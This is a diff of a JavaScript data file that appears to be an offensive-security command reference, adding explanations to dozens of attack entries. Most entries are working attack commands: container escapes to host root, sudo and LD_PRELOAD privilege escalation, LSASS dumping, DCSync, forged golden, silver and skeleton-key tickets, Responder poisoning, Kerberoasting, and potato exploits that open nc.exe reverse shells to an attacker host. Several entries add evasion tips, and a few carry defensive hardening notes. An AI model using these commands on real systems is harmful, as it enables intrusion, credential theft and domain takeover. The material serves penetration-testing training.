+      "explain": "Abuses the disk group's raw block-device access to read any file:\n  debugfs /dev/sda1        open the root filesystem device directly (disk-group membership grants this)\nInside debugfs (or with debugfs -R 'cat /etc/shadow' /dev/sda1) you can read /etc/shadow, root's SSH key, or any file, bypassing filesystem permissions. The adm group similarly reads all system logs, often exposing credentials."
     },
     {
       "type": "command",
@@ -63627,7 +63863,8 @@ const COMMAND_DATA = {
           "label": "Escape to root via a bind-mount",
           "command": "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
         }
-      ]
+      ],
+      "explain": "Escapes to host root via docker-group membership (root-equivalent):\n  docker run -v /:/mnt     mount the host root filesystem into a container\n  --rm -it ubuntu          throwaway interactive Ubuntu container\n  chroot /mnt bash         chroot into the host filesystem and get a shell as its root\nOne command to a host root shell; you can also just cat a root-only file via the mount. id | grep docker confirms membership."
     },
     {
       "type": "command",
@@ -63738,7 +63975,8 @@ const COMMAND_DATA = {
           "label": "Use a static docker binary against the socket",
           "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
         }
-      ]
+      ],
+      "explain": "Talks to the host Docker daemon through a docker.sock mounted in the container:\n  /tmp/docker              an uploaded docker client\n  -H unix:///app/docker.sock   target the mounted host daemon socket\n  run --rm -d --privileged   launch a throwaway privileged container\n  -v /:/hostsystem         bind-mount the host root filesystem into it\n  main_app                 the image to run\nExec into it and read /hostsystem/root/.ssh/id_rsa - full host access. A one-liner alpine chroot variant does the same."
     },
     {
       "type": "command",
@@ -63854,7 +64092,8 @@ const COMMAND_DATA = {
           "label": "Import a prebuilt alpine image",
           "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t"
         }
-      ]
+      ],
+      "explain": "Escapes to host root via lxd/lxc group by launching a privileged container:\n  lxc init <image> r00t    create a container named r00t from an imported image\n  -c security.privileged=true   run it privileged (no UID remapping)\nThen lxc config device add mounts the host / into it, and lxc exec drops you into a shell with root read/write of the host filesystem under /mnt/root."
     },
     {
       "type": "command",
@@ -64273,7 +64512,8 @@ const COMMAND_DATA = {
           "label": "Get a shell with the ticket",
           "command": "psexec.py -k -no-pass <domain>/<user>@<target_fqdn> -target-ip <target_ip>"
         }
-      ]
+      ],
+      "explain": "Gets a SYSTEM shell on a remote host using a Kerberos ticket (pass-the-ticket):\n  psexec.py                impacket's service-based remote execution\n  <domain>/<user>@<target_fqdn>   the account and target (FQDN required for Kerberos)\n  -k                       authenticate with the ticket in KRB5CCNAME\n  -no-pass                 do not prompt for a password\n  -target-ip <target_ip>   resolve the host to this IP\nUsed after an ExtraSids golden ticket or NoPac; wmiexec/smbexec are quieter alternatives with the same -k -no-pass."
     },
     {
       "id": "ptunnel-ng",
@@ -64487,7 +64727,8 @@ const COMMAND_DATA = {
           "label": "Parse the dump offline",
           "command": "pypykatz lsa minidump lsass.dmp"
         }
-      ]
+      ],
+      "explain": "Parses an LSASS minidump offline with a pure-Python Mimikatz, so nothing runs on the target:\n  pypykatz lsa minidump    parse a saved LSASS dump for secrets\n  <dump_file>              the exfiltrated lsass.dmp\nRecovers NT hashes and sometimes cleartext passwords and Kerberos keys; crack NT hashes with hashcat -m 1000. pypykatz live lsa reads live LSA if you have SeDebug on-host."
     },
     {
       "type": "command",
@@ -64606,7 +64847,8 @@ const COMMAND_DATA = {
           "MITRE T1548.003"
         ],
         "evasion": "Place the hijack file, trigger once, then remove it and restore the path so the change is transient."
-      }
+      },
+      "explain": "Hijacks a module imported by a root-run Python script:\n  sudo /usr/bin/python3 ./mem_status.py   run the sudo-allowed script after planting your hijack\nFirst find (sudo -l) the runnable script and which module it imports, then pick a writable vector: overwrite the module file, drop a same-named module earlier in sys.path, use PYTHONPATH (if SETENV is allowed), or append to a writable script. Your code (e.g. os.system('/bin/bash')) then runs as root."
     },
     {
       "type": "command",
@@ -64811,7 +65053,8 @@ const COMMAND_DATA = {
           "label": "Confirm EA on the parent",
           "command": "# raiseChild drops a SYSTEM shell on the forest root DC"
         }
-      ]
+      ],
+      "explain": "Automates the entire child-to-parent escalation in one command:\n  raiseChild.py            impacket's child->parent automation\n  -target-exec <parent_dc_ip>   run a payload on the forest-root DC once escalated\n  <child_domain>/<child_admin>:<password>   child-domain admin credentials\nInternally it DCSyncs the child krbtgt, enumerates SIDs, forges an ExtraSids golden ticket, and psexecs the parent DC - dropping a SYSTEM shell on the forest root. Use -hashes for pass-the-hash instead of a password."
     },
     {
       "type": "command",
@@ -65474,7 +65717,8 @@ const COMMAND_DATA = {
           "label": "Check if AMSI is likely active (quick)",
           "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') -ne $null"
         }
-      ]
+      ],
+      "explain": "Before loading any offensive PowerShell, checks what defenses are watching so you pick the right bypass:\n  $ExecutionContext.SessionState.LanguageMode   FullLanguage vs ConstrainedLanguage (CLM changes what you can run)\nFollow with whoami /all (privileges/groups), klist (current tickets), Get-AppLockerPolicy -Effective (allow-listing), and Get-MpComputerStatus/Get-MpPreference (Defender status + exclusion paths). Knowing this avoids burning the host with the wrong tool."
     },
     {
       "type": "reference",
@@ -65539,7 +65783,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1552.002"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A reference to the registry values that store autologon credentials in cleartext:\n  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"   read the Winlogon key\nWhen AdminAutoLogon is enabled, DefaultUserName/DefaultDomainName/DefaultPassword hold the auto-login account's plaintext password - a quick credential."
     },
     {
       "type": "reference",
@@ -66160,7 +66405,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1548.001"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A lookup of Linux capability meanings, anchored by the enumeration command:\n  getcap -r / 2>/dev/null  recursively list every file capability on the system, discarding errors\nMatch the results against the card's list of high-value capabilities (cap_setuid, cap_dac_override, cap_sys_admin, etc.) to see which grant a path to root."
     },
     {
       "type": "reference",
@@ -66230,7 +66476,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1068"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "The defensive counterpart - hardening measures plus an automated auditor:\n  ./lynis audit system     run Lynis to scan the host and score its hardening, flagging the misconfigurations this module abuses\nUse it to find (or verify you have closed) the escalation paths covered by the privesc cards."
     },
     {
       "type": "reference",
@@ -66305,7 +66552,8 @@ const COMMAND_DATA = {
       "mitre": [
         "T1068"
       ],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "A fast version-to-exploit lookup for Linux local root:\n  uname -r                 the kernel release\n  sudo -V | head -n1       the sudo version\nCompare both against the card's table mapping kernel/sudo/polkit versions to known local-root exploits - the first thing to check on any Linux target."
     },
     {
       "type": "reference",
@@ -67987,7 +68235,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "powershell"
-      ]
+      ],
+      "explain": "Creates a PSSession endpoint that runs as a stored credential, solving the Kerberos double-hop:\n  Register-PSSessionConfiguration   define a custom WinRM endpoint\n  -Name <sessname>         the endpoint name to connect to\n  -RunAsCredential <domain>\\<user>   run every session under these creds, so they exist on the box for a second hop\n  -Force                   overwrite/skip prompts\nConnect to it (Enter-PSSession -ConfigurationName <sessname>) and onward access to a third machine now authenticates, instead of failing with no forwarded credentials."
     },
     {
       "id": "ad-impacket-rbcd",
@@ -68093,7 +68342,8 @@ const COMMAND_DATA = {
           "a": "Set MachineAccountQuota to 0 so users cannot add computer accounts, and restrict/monitor write access to computer delegation attributes (alert on Event 5136 for msDS-AllowedToActOnBehalfOfOtherIdentity). Also mark privileged accounts 'sensitive and cannot be delegated' / add them to Protected Users.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Configures Resource-Based Constrained Delegation on a computer you have write over, so a machine account you control can impersonate any user to it:\n  -delegate-to '<target_account>$'   the victim computer whose msDS-AllowedToActOnBehalfOfOtherIdentity you write\n  -delegate-from 'EVIL$'    the attacker-controlled computer account granted delegation\n  -action write             add the delegation ACE (use read/remove to check/clean up)\n  -dc-ip <dc_ip>            the Domain Controller\n  <domain>/<user>:<password>   the account with write over the target\nThen use getST -impersonate Administrator to mint a service ticket to the target as any user."
     },
     {
       "id": "crtp-rbcd",
@@ -68211,7 +68461,8 @@ const COMMAND_DATA = {
           "label": "Read back RBCD config",
           "command": "Get-DomainRBCD"
         }
-      ]
+      ],
+      "explain": "Writes msDS-AllowedToActOnBehalfOfOtherIdentity on a computer you can write to, setting up RBCD:\n  Set-ADComputer -Identity <target_computer>   the victim computer object\n  -PrincipalsAllowedToDelegateToAccount <attacker_computer>$   the machine account allowed to impersonate to it\nRequires GenericWrite/WriteDACL on the target. Then Rubeus s4u (S4U2Self+S4U2Proxy) as <attacker_computer>$ mints a service ticket to the target impersonating Administrator."
     },
     {
       "id": "ad-responder-poison",
@@ -68328,7 +68579,8 @@ const COMMAND_DATA = {
           "label": "Crack them",
           "command": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Actively poisons name resolution to capture NetNTLMv2 hashes:\n  sudo responder           the poisoner\n  -I <interface>           answer LLMNR/NBT-NS/mDNS requests on this interface as if you own the name\nHosts that mistype or fail DNS then authenticate to you; captures land in /usr/share/responder/logs/. Run during business hours for volume; crack with hashcat -m 5600. -A is analyze-only, -wv adds WPAD + verbose."
     },
     {
       "id": "ad-responder-analyze",
@@ -68421,7 +68673,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Responder"
-      ]
+      ],
+      "explain": "Runs Responder passively to scope the attack before poisoning:\n  sudo responder           the poisoner\n  -I <interface>           listen on this interface\n  -A                       analyze mode - log who is broadcasting LLMNR/NBT-NS/mDNS queries WITHOUT answering\nUse this first to confirm victims exist and gauge volume, so you only go active when it is worthwhile."
     },
     {
       "id": "responder-poison",
@@ -68731,7 +68984,8 @@ const COMMAND_DATA = {
           "MITRE T1059",
           "MITRE T1548"
         ]
-      }
+      },
+      "explain": "Breaks out of a restricted shell (rbash/rksh/rzsh) using allowed built-ins:\n  ls -l `pwd`              command substitution - backticks run pwd even though cd/redirection are blocked\nRestricted shells block cd, redirection, and PATH changes but often still allow $()/backticks, built-ins, and chaining metacharacters - use those to read files or spawn an unrestricted shell."
     },
     {
       "type": "command",
@@ -69384,7 +69638,8 @@ const COMMAND_DATA = {
           "label": "Loop over a userlist",
           "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done"
         }
-      ]
+      ],
+      "explain": "Sprays a password over MS-RPC as a fallback when Kerberos/SMB spray is blocked:\n  for u in $(cat <userlist>)   loop over each username\n  rpcclient -U \"$u%<password>\"   authenticate as user%password\n  -c 'getusername;quit' <dc_ip>   run a trivial command to test the login\n  | grep 'Account Name'    a successful auth returns this; failures do not\nOne password across the whole list over port 445/TCP."
     },
     {
       "id": "rpivot",
@@ -69700,7 +69955,8 @@ const COMMAND_DATA = {
           "label": "Crack (hashcat 18200)",
           "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Rubeus AS-REP roasts from a domain-joined Windows host:\n  asreproast               request AS-REP tickets for pre-auth-disabled accounts (omit /user to roast all)\n  /user:<user>             target a single account\n  /nowrap                  print the whole hash on one line for easy copy\n  /format:hashcat          emit $krb5asrep$ compatible with hashcat -m 18200\nCrack the output offline to recover the password."
     },
     {
       "id": "ad-golden-ticket-rubeus",
@@ -69812,7 +70068,8 @@ const COMMAND_DATA = {
           "label": "Access parent DC",
           "command": "dir \\\\<parent_dc>\\C$"
         }
-      ]
+      ],
+      "explain": "Forges the same ExtraSids Golden Ticket with Rubeus (more AV-evasive than Mimikatz):\n  golden                   forge a TGT offline\n  /rc4:<child_krbtgt_hash>  the child krbtgt NT hash (RC4 key) - use /aes256 to be stealthier\n  /domain:<child_domain> /sid:<child_sid>   the child domain and SID\n  /sids:<parent_EA_sid>    inject the parent EA SID into SID History (child->parent escalation)\n  /user:Administrator /ptt  impersonate Administrator and inject\nThe injected ticket grants EA-level access to the parent DC."
     },
     {
       "id": "ad-rubeus-kerberoast",
@@ -69944,7 +70201,8 @@ const COMMAND_DATA = {
           "label": "Pivot as the service account",
           "command": "# check local admin / delegation on its hosts"
         }
-      ]
+      ],
+      "explain": "Roasts every SPN account from a domain-joined host:\n  kerberoast               request TGS tickets for all SPN accounts\n  /nowrap                  print each hash on one line (no base64 line breaks)\nUse /rc4opsec to skip AES-only accounts (avoids noisy downgrades), /stats to profile the attack surface first, or /tgtdeleg to roast without credentials using the current TGT. Crack with hashcat -m 13100."
     },
     {
       "id": "ad-rubeus-kerberoast-user",
@@ -70046,7 +70304,8 @@ const COMMAND_DATA = {
           "label": "OPSEC single user",
           "command": ".\\Rubeus.exe kerberoast /user:<user> /rc4opsec /nowrap /outfile:hash.txt"
         }
-      ]
+      ],
+      "explain": "Roasts one specific SPN account (targeted or quiet Kerberoasting):\n  kerberoast               request a TGS for cracking\n  /user:<user>             only this account (e.g. after planting a fake SPN via GenericWrite)\n  /nowrap                  print the hash on one line\nGenerates a single Event 4769 instead of one per SPN, so it is far quieter than bulk roasting; crack with hashcat -m 13100."
     },
     {
       "id": "rubeus-ptt",
@@ -70165,7 +70424,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Over-pass-the-hash with Rubeus - turn a key into a TGT and inject it:\n  asktgt                   request a TGT from the KDC\n  /domain:<domain> /user:<user>   the account\n  /rc4:<nt_hash>           the NT hash used as the Kerberos key (/aes256 for opsec)\n  /ptt                     inject the resulting ticket into this session\nThen tools authenticate as that user over Kerberos. dump lists tickets, ptt /ticket loads a .kirbi, createnetonly spawns a sacrificial logon session."
     },
     {
       "id": "ad-runas-netonly",
@@ -70253,7 +70513,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "runas"
-      ]
+      ],
+      "explain": "Spawns a process carrying AD credentials for network auth, even off a non-domain-joined host:\n  runas /netonly           the injected creds are used only for outbound network authentication, not local logon\n  /user:<domain>\\<user>    the account to authenticate as\n  powershell               the process to launch with those creds\nYou will be prompted for the password. Run domain tools (PowerView, etc.) in that window and they authenticate to the DC as <user>."
     },
     {
       "type": "reference",
@@ -70483,7 +70744,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Crawls SMB share file contents (not just names) for a secret pattern:\n  nxc smb <ip>             NetExec over SMB\n  -u <user> -p '<password>'   authenticate\n  --spider <share>         recurse into this share\n  --content                read file bodies\n  --pattern \"passw\"        the string to match inside files\nSurfaces credentials hidden inside documents and configs; MANSPIDER is the alternative crawler."
     },
     {
       "type": "command",
@@ -70705,7 +70967,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
-      ]
+      ],
+      "explain": "Performs a full-domain DCSync with impacket over the network:\n  secretsdump.py           the remote secrets dumper\n  -outputfile <outfile>    save results to files (.ntds, etc.)\n  -just-dc                 only pull domain replication data (NT hashes, Kerberos keys), skip local SAM/LSA\n  <domain>/<user>@<dc_ip>  authenticate as an account with DCSync rights against this DC\nDumps every domain account's hashes; crack with hashcat -m 1000 or pass-the-hash."
     },
     {
       "id": "ad-secretsdump-kerberos",
@@ -70794,7 +71057,8 @@ const COMMAND_DATA = {
           "label": "Full DCSync with ticket",
           "command": "KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -just-dc <domain>/administrator@<dc_fqdn>"
         }
-      ]
+      ],
+      "explain": "DCSyncs using a Kerberos ticket instead of a password/hash (for chains like PetitPotam/NoPac):\n  secretsdump.py           impacket remote secrets dumper\n  -just-dc-user <domain>/administrator   only replicate this one account's secrets\n  -k                       use Kerberos auth from the KRB5CCNAME ccache\n  -no-pass                 do not prompt for a password (the ticket authenticates)\n  \"<dc_hostname>@<dc_ip>\"  the DC to replicate from\nOutputs the target's NT hash and Kerberos keys via replication."
     },
     {
       "id": "cdsa-incident-categories",
@@ -71066,7 +71330,8 @@ const COMMAND_DATA = {
           "label": "Exfil + parse offline (keeps mimikatz off the host)",
           "command": "pypykatz lsa minidump lsass.dmp"
         }
-      ]
+      ],
+      "explain": "Uses SeDebugPrivilege to dump LSASS with ProcDump, then parse offline:\n  procdump.exe             Sysinternals dumper (signed, less likely to be flagged)\n  -accepteula              auto-accept the EULA\n  -ma lsass.exe            full memory dump of the LSASS process\n  lsass.dmp                output file\nExfil and parse with pypykatz lsa minidump to recover plaintext passwords and NTLM hashes without running Mimikatz on the host."
     },
     {
       "type": "command",
@@ -71176,7 +71441,8 @@ const COMMAND_DATA = {
           "label": "Duplicate a SYSTEM process token to spawn SYSTEM",
           "command": "[MyProcess]::CreateProcessFromParent(<system_pid>,<command>)"
         }
-      ]
+      ],
+      "explain": "Uses SeDebugPrivilege to spawn a process from a SYSTEM-owned parent, inheriting its token:\n  [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,\"\")   psgetsys.ps1 - create a child of a SYSTEM process (e.g. an lsass/winlogon PID)\nThe child inherits a SYSTEM token and runs your command as SYSTEM. PowerUp's Get-System (NamedPipe/Token techniques) is the packaged equivalent."
     },
     {
       "type": "command",
@@ -71285,7 +71551,8 @@ const COMMAND_DATA = {
           "MITRE T1068"
         ],
         "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet - the noisy part is the spawned shell, so route it through an existing C2 channel."
-      }
+      },
+      "explain": "Abuses SeImpersonatePrivilege via DCOM/BITS to capture a SYSTEM token (JuicyPotato):\n  JuicyPotato.exe          the potato exploit\n  -l 53375                 the local COM server port it listens on\n  -p c:\\windows\\system32\\cmd.exe   the program to launch as SYSTEM\n  -a \"/c c:\\tools\\nc.exe <lhost> <lport> -e cmd.exe\"   its arguments (here a reverse shell)\n  -t *                     try both token-creation methods\nWorks on pre-2019 Windows; use PrintSpoofer/GodPotato on newer builds."
     },
     {
       "type": "command",
@@ -71421,7 +71688,8 @@ const COMMAND_DATA = {
           "label": "Catch the SYSTEM shell",
           "command": "# nc -lvnp <lport> on attacker"
         }
-      ]
+      ],
+      "explain": "Abuses SeImpersonatePrivilege via the print spooler pipe to become SYSTEM (PrintSpoofer):\n  PrintSpoofer.exe         the potato exploit\n  -c \"c:\\tools\\nc.exe <lhost> <lport> -e cmd\"   the command to run as SYSTEM (here a reverse shell)\nConfirm SeImpersonate with whoami /priv, catch the shell on your listener. Works on Windows 10 / Server 2016-2019 where JuicyPotato fails; GodPotato/RoguePotato cover 2019/2022."
     },
     {
       "type": "command",
@@ -71525,7 +71793,8 @@ const COMMAND_DATA = {
           "MITRE T1078.002"
         ],
         "evasion": "Modify the service binPath, trigger once, then restore the original service configuration."
-      }
+      },
+      "explain": "Abuses Server Operators (can reconfigure SYSTEM services) to run a command as SYSTEM:\n  sc config AppReadiness   reconfigure this service\n  binPath= \"cmd /c net localgroup Administrators <user> /add\"   point its executable at a command that adds you to Administrators\nStart the service to execute it as SYSTEM. On a DC this yields Domain Admin, after which you dump the DC hashes."
     },
     {
       "type": "command",
@@ -71786,7 +72055,8 @@ const COMMAND_DATA = {
           "MITRE T1049",
           "MITRE T1135"
         ]
-      }
+      },
+      "explain": "Finds where privileged users are logged on and which shares hold secrets, without needing admin:\n  Invoke-SessionHunter     map user->host sessions via remote registry (no admin required)\n  -NoPortScan              skip the port scan (faster/quieter)\n  -RawResults              return objects, not a formatted table\n  | select Hostname,UserSession,Access   host, the user session found, and whether you can reach it\nWhere an admin session sits on a box you can access, that is your lateral target; PowerHuntShares then inventories readable SMB shares for sensitive data."
     },
     {
       "type": "command",
@@ -71910,7 +72180,8 @@ const COMMAND_DATA = {
           "label": "Read it (e.g. a config/hash/flag)",
           "command": "type '<target_file>'"
         }
-      ]
+      ],
+      "explain": "Abuses SeTakeOwnershipPrivilege to own and read any protected file:\n  takeown /f '<target_file>'   seize ownership of the file\nThen icacls '<target_file>' /grant <user>:F gives yourself full control, and type reads it (cred files, SAM/SYSTEM backups, web.config). Enable the privilege first (EnableAllTokenPrivs.ps1); add /r /d y to take a directory recursively."
     },
     {
       "id": "ad-setspn-manual",
@@ -72012,7 +72283,8 @@ const COMMAND_DATA = {
           "label": "Forest-wide",
           "command": "setspn.exe -T <forest> -Q */*"
         }
-      ]
+      ],
+      "explain": "Lists domain SPNs with the native Windows tool (living-off-the-land Kerberoasting):\n  setspn.exe -Q */*        query for all SPNs in the domain (-L <account> for one account, -T <forest> for forest-wide)\nCombined with .NET's KerberosRequestorSecurityToken (to request the ticket) and Mimikatz kerberos::list /export (to extract it), you can Kerberoast with zero third-party offensive tooling."
     },
     {
       "id": "ptc-pywhisker",
@@ -72106,7 +72378,8 @@ const COMMAND_DATA = {
           "label": "Add a Key Credential (shadow creds)",
           "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add"
         }
-      ]
+      ],
+      "explain": "Plants a Shadow Credential on a target to obtain a PFX you can authenticate with:\n  pywhisker                msDS-KeyCredentialLink manipulator\n  --dc-ip <dc_ip>          the Domain Controller\n  -d <domain> -u <user> -p '<password>'   authenticate as the account with write access\n  --target <target_user>   the victim whose msDS-KeyCredentialLink you write\n  --action add             add an attacker-controlled key credential\nYou get a PFX for the target; use it with gettgtpkinit (PKINIT) to authenticate as them."
     },
     {
       "id": "ad-shadow-credentials",
@@ -72332,7 +72605,8 @@ const COMMAND_DATA = {
           "MITRE T1574.006",
           "MITRE T1548.003"
         ]
-      }
+      },
+      "explain": "Loads a malicious shared library into a sudo-allowed command when LD_PRELOAD is kept:\n  sudo LD_PRELOAD=/tmp/root.so   force the loader to preload your library first\n  /usr/sbin/apache2 restart   an allowed sudo command that will load it\nRequires env_keep+=LD_PRELOAD in sudoers (check sudo -l). Your library's _init() constructor runs as root, spawning a root shell. Compile it with gcc -fPIC -shared -nostartfiles."
     },
     {
       "id": "ad-sharphound",
@@ -73101,7 +73375,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts with stale NTLM hashes (Kerberoastable). PAC validation disabled. gMSA not used. No monitoring for Kerberos auth without prior DC exchange.",
         "vulnerable_config": "# Stale service account hash (Kerberoasted and cracked):\n# svc_mssql password 'Sql@2019' - unchanged since 2019\n# Silver ticket forged for MSSQLSvc/sql01.corp.local\n# → Full DB access as 'Administrator' with no DC events\n\n# PAC validation off (default):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').ValidateKdcPacSignature  # null = off",
         "secure_config": "# gMSA for all service accounts:\nNew-ADServiceAccount -Name svc_mssql -DNSHostName sql.corp.local -ManagedPasswordIntervalInDays 30\n\n# Enable PAC validation:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name ValidateKdcPacSignature -Value 1\n\n# MDI: silver ticket detection enabled by default"
-      }
+      },
+      "explain": "Forges a Silver Ticket - a TGS for one service, signed with the service account's hash, never contacting the KDC:\n  kerberos::golden         (Mimikatz forges the ticket offline; /target+/service make it a silver TGS)\n  /sid:<domain_sid> /domain:<domain>   the domain and its SID\n  /target:<svc_host>.<domain> /service:<svc_name>   the specific host and service (e.g. cifs)\n  /rc4:<svc_account_nt_hash>   the service/machine account hash that signs it\n  /user:<fake_user> /ptt   the impersonated user, injected\nBecause no AS/TGS request hits a DC, there is no 4768/4769 to detect; access is limited to that one service."
     },
     {
       "id": "crtp-silver-ticket",
@@ -73230,7 +73505,8 @@ const COMMAND_DATA = {
           "label": "Mimikatz",
           "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
         }
-      ]
+      ],
+      "explain": "Forges a Silver Ticket - a TGS for one service, signed with that service account's hash - bypassing the KDC entirely (quieter than golden):\n  silver                    forge a service ticket offline\n  /service:<spn>           the target SPN (e.g. cifs/<host> for file access)\n  /rc4:<nt_hash>           the service/machine account's NTLM hash\n  /sid:<domain_sid>        the domain SID\n  /user:Administrator      the user to impersonate to that service\n  /domain:<domain> /ptt    the domain, and inject the ticket\nNo AS/TGS request ever reaches a DC, so there is no 4768/4769 to correlate; access is limited to that one service."
     },
     {
       "id": "crtp-skeleton-key",
@@ -73344,7 +73620,8 @@ const COMMAND_DATA = {
           "label": "Then auth with the master password 'mimikatz'",
           "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
         }
-      ]
+      ],
+      "explain": "Patches LSASS on a DC to add a master password that authenticates as ANY account alongside its real one:\n  Invoke-Mimikatz          run Mimikatz remotely\n  -Command '\"misc::skeleton\"'   inject the skeleton key into lsass on the DC\n  -ComputerName <dc_host>  the Domain Controller to patch (needs DA + code exec on the DC)\nAfterwards any user logs on with the password 'mimikatz' (or their own). It lives only in memory, so it does NOT survive a DC reboot - re-inject as needed."
     },
     {
       "type": "command",
@@ -74835,7 +75112,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Auto-hunts secrets across reachable SMB shares from a domain-joined context:\n  Snaffler.exe             enumerate shares and grade files by keyword, extension, and name\n  -s                       also print findings to stdout (live)\nIt classifies hits by likely sensitivity so you triage the juiciest files first; -u also enumerates AD users, -i/-n target specific shares."
     },
     {
       "type": "command",
@@ -83030,7 +83308,8 @@ const COMMAND_DATA = {
           "OWASP A06:2021"
         ],
         "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
-      }
+      },
+      "explain": "Runs the Baron Samedit heap-overflow exploit for root on sudo <= 1.9.5p1:\n  ./sudo-hax-me-a-sandwich   trigger the overflow\n  <target_id>              the offset/target profile matching the host's sudo+GLIBC\nWorks regardless of sudoers. Check sudo -V, compile against the target's GLIBC (use a matching Docker image if versions differ), then run with the right target id."
     },
     {
       "type": "command",
@@ -83122,7 +83401,8 @@ const COMMAND_DATA = {
           "MITRE T1548.003"
         ],
         "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
-      }
+      },
+      "explain": "Bypasses a sudoers rule that allows running as any user except root (sudo < 1.8.28):\n  sudo -u#-1               run as user id -1, which the flawed lookup resolves to 0 (root)\n  id                       confirm you are root\nWorks when sudo -l shows a rule like (ALL, !root) <binary>: sudo -u#-1 <binary> runs it as root despite the !root exclusion."
     },
     {
       "type": "command",
@@ -83241,7 +83521,8 @@ const COMMAND_DATA = {
           "label": "Abuse an allowed binary to get a root shell",
           "command": "# e.g. sudo vim -c ':!/bin/sh'  |  sudo less /etc/profile then !/bin/sh"
         }
